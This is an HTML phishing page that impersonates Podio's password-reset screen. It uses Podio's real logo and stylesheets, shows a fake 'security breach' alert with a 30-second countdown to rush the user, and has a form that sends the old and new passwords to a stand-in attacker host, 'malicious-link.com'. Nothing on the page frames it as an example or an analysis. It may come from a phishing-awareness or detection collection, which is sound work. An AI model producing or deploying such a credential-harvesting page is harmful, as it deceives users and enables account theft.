<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Your Podio Password</title>
    <link rel="shortcut icon" href="https://d3apguah0u98pa.cloudfront.net/images/favicon.ico" sizes="16x16 32x32 64x64">
    <link rel="stylesheet" href="https://d3apguah0u98pa.cloudfront.net/stylesheets-visual-refresh/_129f8cef/compressed/base.css">
    <link rel="stylesheet" href="https://d3apguah0u98pa.cloudfront.net/stylesheets-visual-refresh/_129f8cef/compressed/common_ui.css">
    <link rel="stylesheet" href="https://d3apguah0u98pa.cloudfront.net/stylesheets-visual-refresh/_129f8cef/compressed/user.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 40px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #3B5998;
            font-size: 24px;
            text-align: center;
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 120px;
        }
        form {
            margin-top: 20px;
        }
        label {
            font-size: 14px;
            margin-bottom: 8px;
            color: #333;
        }
        input[type="password"],
        input[type="submit"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 16px;
            border-radius: 4px;
        }
        input[type="password"] {
            border: 1px solid #ccc;
        }
        input[type="submit"] {
            background-color: #556cd6;
            border: none;
            color: white;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #465ab0;
        }
        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #666;
        }
        .footer a {
            color: #007BFF;
            text-decoration: none;
        }
        .progress-container {
            width: 100%;
            background-color: #e0e0e0;
            border-radius: 25px;
            margin-top: 10px;
            height: 20px;
            position: relative;
        }
        .progress-bar {
            height: 100%;
            width: 0;
            background-color: red;
            border-radius: 25px;
            transition: width 0.4s, background-color 0.4s;
        }
        .urgent-alert {
            background-color: #ffcc00;
            color: #000;
            padding: 15px;
            border: 2px solid red;
            font-size: 18px;
            text-align: center;
            margin-bottom: 20px;
        }
        .urgent-alert span {
            color: red;
        }
        .security-tip {
            background-color: #f9f9f9;
            padding: 15px;
            margin-top: 20px;
            border-left: 5px solid #556cd6;
        }
        .countdown {
            font-size: 20px;
            font-weight: bold;
            color: red;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="urgent-alert">
            Security breach detected! Reset your password now.<br> Time remaining: <span id="countdown-timer">30</span> seconds.
        </div>
        <img src="https://d3apguah0u98pa.cloudfront.net/images/podiologo_og-v4.png" alt="Podio Logo" class="logo">
        <h1>Reset Your Podio Password</h1>
        <form action="http://malicious-link.com" method="post">
            <label for="old-password">Old Password</label>
            <input type="password" id="old-password" name="old-password" placeholder="Enter your old password" required>
            <label for="new-password">New Password</label>
            <input type="password" id="new-password" name="new-password" placeholder="Enter your new password" required oninput="updateProgressBar()">
            <div class="progress-container">
                <div class="progress-bar" id="progress-bar"></div>
            </div>
            <div class="security-tip">
                <strong>Security Tip:</strong> Use at least 8 characters, including a mix of uppercase letters, numbers, and symbols.
            </div>
            <label for="confirm-password">Confirm New Password</label>
            <input type="password" id="confirm-password" name="confirm-password" placeholder="Confirm your new password" required>
            <input type="submit" value="Reset Password">
        </form>
        <div class="footer">
            <p>If you did not request this, please <a href="https://support.podio.com/">contact support</a> immediately.</p>
        </div>
    </div>
    <script>
        function updateProgressBar() {
            const password = document.getElementById('new-password').value;
            const progressBar = document.getElementById('progress-bar');
            const progress = Math.min((password.length / 16) * 100, 100);
            progressBar.style.width = progress + "%";
            progressBar.style.backgroundColor = progress < 33 ? "red" : (progress < 66 ? "orange" : "green");
        }

        let countdownTime = 30;
        const countdownElement = document.getElementById('countdown-timer');
        const countdownInterval = setInterval(() => {
            countdownTime--;
            countdownElement.textContent = countdownTime;
            if (countdownTime <= 0) {
                clearInterval(countdownInterval);
                alert("Your account will require additional intervention from the Podio security team.");
            }
        }, 1000);
    </script>
</body>
</html>
